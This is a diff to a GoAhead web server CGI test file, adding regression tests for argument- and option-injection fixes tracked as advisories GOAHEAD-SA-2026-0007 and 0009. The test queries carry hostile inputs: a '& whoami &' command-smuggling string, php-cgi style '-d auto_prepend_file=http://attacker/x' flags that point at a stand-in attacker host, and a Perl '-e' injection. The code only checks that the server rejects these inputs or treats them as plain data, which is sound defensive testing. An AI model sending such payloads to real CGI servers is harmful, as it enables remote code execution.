@@ -2,8 +2,8 @@
     cgi.tst - CGI tests
  */
 
-import { Http, Config, Path } from 'ejscript'
-import { tget, thas, tskip, ttrue } from 'testme'
+import { Http, Config, Path } from '@embedthis/ejscript'
+import { tget, thas, tskip, ttrue } from '@embedthis/testme'
 
 const HTTP = tget('TM_HTTP') || "127.0.0.1:8080"
 let http: Http = new Http
@@ -288,6 +288,207 @@ if (thas('ME_GOAHEAD_CGI')) {
         h.close()
     }
 
+    /*
+        Layer 2 of the cgi-windows-arg-injection fix (GOAHEAD-SA-2026-0007).
+        ISINDEX argv round-trip end-to-end through the HTTP path.
+
+        On POSIX (macOS / Linux) these tests exercise the unchanged execve
+        array path - argument boundaries are preserved by the kernel.
+        On Windows they exercise the fixed launchCgi() path - the CRT-correct
+        quoting in appendWinArg + buildWinCmdLine reproduces the same argv on
+        the receiving CGI program. Identical assertions on both platforms is
+        the point: the fix restores cross-platform parity.
+
+        Tests assert on cgitest's "ARG[i]=value" lines emitted by the default
+        argv-dump output. The -a switch is implied by cgitest's default mode.
+     */
+    async function argvRoundTrip() {
+        async function send(query: string): Promise<string> {
+            let h: Http = new Http
+            h.get(HTTP + "/cgi-bin/cgitest?" + query)
+            await h.wait()
+            ttrue(h.status == 200)
+            let body = h.response
+            h.close()
+            return body
+        }
+
+        function hasArg(body: string, n: number, value: string): void {
+            //  cgitest emits "<P>ARG[n]=value</P>"; assert on the substring
+            let needle = "ARG[" + n + "]=" + value
+            if (!body.contains(needle)) {
+                console.log("expected " + needle + " in response, got:\n" + body)
+            }
+            ttrue(body.contains(needle))
+        }
+
+        let body: string
+
+        /*
+            GOAHEAD-SA-2026-0009 reconciliation: ISINDEX search terms now reach argv only as
+            positional operands, preceded by a "--" end-of-options marker (ARG[1]). Benign
+            metacharacter tokens still round-trip verbatim, but every ARG[i] index shifts +1
+            because the marker occupies ARG[1]. Option-looking (-leading) or decoded-'=' queries
+            are rejected with HTTP 400 (see isindexDashReject / isindexEncodedEqReject).
+
+            ARG[0] is the CGI path; ARG[1] is the injected "--"; operands begin at ARG[2].
+         */
+
+        /*  Reporter's .bat PoC shape, sent against the .exe (cgitest).
+            On any sane runtime the metacharacters must survive as argv
+            data, not be interpreted as shell separators.   */
+        body = await send("x+%26+whoami+%26+rem")
+        hasArg(body, 1, "--")
+        hasArg(body, 2, "x")
+        hasArg(body, 3, "&")
+        hasArg(body, 4, "whoami")
+        hasArg(body, 5, "&")
+        hasArg(body, 6, "rem")
+        ttrue(!body.contains("uid="), "no whoami output in response body")
+
+        /*  Single shell metacharacter as a single argv element each.   */
+        for (let mc of ["%26", "%7c", "%3c", "%3e", "%5e", "%25", "%28", "%29"]) {
+            body = await send("x+" + mc + "+y")
+            hasArg(body, 1, "--")
+            hasArg(body, 2, "x")
+            hasArg(body, 4, "y")
+        }
+
+        /*  Quoted token: "two three" inside a single argv element.   */
+        body = await send("one+%22two+three%22+four")
+        hasArg(body, 1, "--")
+        hasArg(body, 2, "one")
+        hasArg(body, 3, "\"two")
+        hasArg(body, 4, "three\"")
+        hasArg(body, 5, "four")
+
+        /*  Backslash inside a token.   */
+        body = await send("path%5Cfile+next")
+        hasArg(body, 1, "--")
+        hasArg(body, 2, "path\\file")
+        hasArg(body, 3, "next")
+
+        /*  Trailing backslashes in a token (the BS-before-closing-quote rule).   */
+        body = await send("trail%5C%5C%5C%5C+after")
+        hasArg(body, 1, "--")
+        hasArg(body, 2, "trail\\\\\\\\")
+        hasArg(body, 3, "after")
+
+        /*  Backslash-before-quote (BatBadBut shape).   */
+        body = await send("a+%5C%22+b")
+        hasArg(body, 1, "--")
+        hasArg(body, 2, "a")
+        hasArg(body, 3, "\\\"")
+        hasArg(body, 4, "b")
+
+        /*  UTF-8 multi-byte content.   */
+        body = await send("caf%C3%A9+au+lait")
+        hasArg(body, 1, "--")
+        hasArg(body, 2, "café")
+        hasArg(body, 3, "au")
+        hasArg(body, 4, "lait")
+    }
+
+    /*
+        GOAHEAD-SA-2026-0009 (CWE-88) security tests. Each must fail against the pre-patch
+        binary (which delivered -leading and decoded-'=' tokens straight into the CGI argv)
+        and pass post-patch (HTTP 400, no argv built).
+     */
+    async function status400(query: string): Promise<Http> {
+        let h: Http = new Http
+        h.get(HTTP + "/cgi-bin/cgitest?" + query)
+        await h.wait()
+        return h
+    }
+
+    async function isindexDashReject() {
+        //  Reporter's .exe PoC shape (php-cgi-style -d flags) now rejected outright.
+        for (let q of ["-d+-r+-c", "-d+allow_url_include%3d1+-d+auto_prepend_file%3dhttp://attacker/x", "-e"]) {
+            let h = await status400(q)
+            ttrue(h.status == 400)
+            //  No option token should have reached argv / been echoed.
+            ttrue(!h.response.contains("ARG[1]=-"))
+            h.close()
+        }
+    }
+
+    async function isindexEncodedEqReject() {
+        //  Encoded '=' bypasses the raw '=' gate but must be caught post-decode.
+        for (let q of ["-d+foo%3Dbar", "foo%3Dbar", "a%3Db"]) {
+            let h = await status400(q)
+            ttrue(h.status == 400)
+            h.close()
+        }
+    }
+
+    async function isindexPerlMarker() {
+        //  Interpreter option-injection shape (?-e+print...). Must be rejected, and the
+        //  marker an interpreter would emit must never appear in the response.
+        let h = await status400("-e+print%20%22INJECTED_MARKER%22")
+        ttrue(h.status == 400)
+        ttrue(!h.response.contains("INJECTED_MARKER"))
+        h.close()
+    }
+
+    /*
+        GOAHEAD-SA-2026-0009 regression / success-path tests: benign ISINDEX search terms
+        still reach the CGI as positional operands, and the literal-'=' and no-token paths
+        are unchanged.
+     */
+    async function isindexPositional() {
+        let h: Http = new Http
+        h.get(HTTP + "/cgi-bin/cgitest?red+green+blue")
+        await h.wait()
+        ttrue(h.status == 200)
+        let body = h.response
+        ttrue(body.contains("ARG[1]=--"))
+        ttrue(body.contains("ARG[2]=red"))
+        ttrue(body.contains("ARG[3]=green"))
+        ttrue(body.contains("ARG[4]=blue"))
+        h.close()
+    }
+
+    async function isindexEmpty() {
+        //  Bare CGI with no query: argv is [cgiPath] only — no "--" marker injected.
+        let h: Http = new Http
+        h.get(HTTP + "/cgi-bin/cgitest")
+        await h.wait()
+        ttrue(h.status == 200)
+        ttrue(!h.response.contains("ARG[1]=--"))
+        h.close()
+    }
+
+    async function isindexKeyvalue() {
+        //  Literal '=' query is not ISINDEX: reaches the CGI via QUERY_STRING, no "--" in argv.
+        let h: Http = new Http
+        h.get(HTTP + "/cgi-bin/cgitest?a=b&c=d")
+        await h.wait()
+        ttrue(h.status == 200)
+        let body = h.response
+        ttrue(body.contains("QVAR a=b"))
+        ttrue(body.contains("QVAR c=d"))
+        ttrue(!body.contains("ARG[1]=--"))
+        h.close()
+    }
+
+    async function isindexManyTokens() {
+        //  Exercise the argpsize doubling with the extra "--" slot: 15 operands + marker.
+        let tokens = []
+        for (let i = 1; i <= 15; i++) {
+            tokens.push("t" + i)
+        }
+        let h: Http = new Http
+        h.get(HTTP + "/cgi-bin/cgitest?" + tokens.join("+"))
+        await h.wait()
+        ttrue(h.status == 200)
+        let body = h.response
+        ttrue(body.contains("ARG[1]=--"))
+        for (let i = 1; i <= 15; i++) {
+            ttrue(body.contains("ARG[" + (i + 1) + "]=t" + i))
+        }
+        h.close()
+    }
+
     await forms()
     await extraPath()
     await query()
@@ -297,6 +498,14 @@ if (thas('ME_GOAHEAD_CGI')) {
     await quoting()
     await post()
     await httpoxyAndBlacklist()
+    await argvRoundTrip()
+    await isindexDashReject()
+    await isindexEncodedEqReject()
+    await isindexPerlMarker()
+    await isindexPositional()
+    await isindexEmpty()
+    await isindexKeyvalue()
+    await isindexManyTokens()
 
 } else {
     tskip("CGI not enabled")
